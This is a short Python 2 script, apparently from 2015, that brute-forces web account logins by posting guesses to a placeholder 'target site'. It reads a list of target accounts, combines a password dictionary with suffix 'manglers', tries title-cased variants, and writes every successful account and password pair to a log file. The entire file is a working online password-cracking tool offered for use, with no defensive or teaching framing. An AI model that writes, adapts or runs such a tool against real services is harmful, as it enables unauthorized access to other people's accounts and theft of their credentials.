'''
Created on Oct 6, 2015

@author: Zeppo
'''

import os
import config
import requests
from re import findall
from linecache import getline


def login(account, passwd):
    """Takes an account name and password
    as arguments and returns true
    if the login is successful
    otherwise returns []"""
    request = requests.post("target site",
                            data={'act': "login",
                                  'name': account,
                                  'pass': passwd,
                                  'challengekeyid': '3',
                                  'challenge': ""})

    return findall("\"loggedin\":true", str(request.text))


def run_crack(file_num):
    """Takes an account name and dictionary
    as arguments and attempts to brute force
    the account given account by with the dictionary"""
    trys = 0
    num_lines = file_len(config.manglers)
    jump = config.num_crackers
    mangs = [getline(config.manglers, i).rstrip() for i in range(file_num, num_lines, jump)]

    with open(config.targets) as targets:
        for account in targets:
            account = account.rstrip()
            for mang in mangs:
                mang = mang.rstrip()
                with open(config.passwd_dict) as passwds:
                    for passwd in passwds:
                        passwd = passwd.rstrip() + mang
                        if login(account, passwd):
                            with open(config.logs, 'a') as logs:
                                logs.write(account+": "+passwd+'\n')
                                os.startfile(config.logs)
                        elif login(account, passwd.title()):
                            with open(config.logs, 'a') as logs:
                                logs.write(account+": "+passwd.title()+'\n')
                        else:
                            trys += 1
                            print '\n-----' + str(file_num)
                            print str(trys)+'\n'+account+': ' + passwd

def file_len(text_file):
    """Returns the number of lines in a text file"""
    with open(text_file) as text_file:
        for i, _ in enumerate(text_file):
            pass
    return i + 1
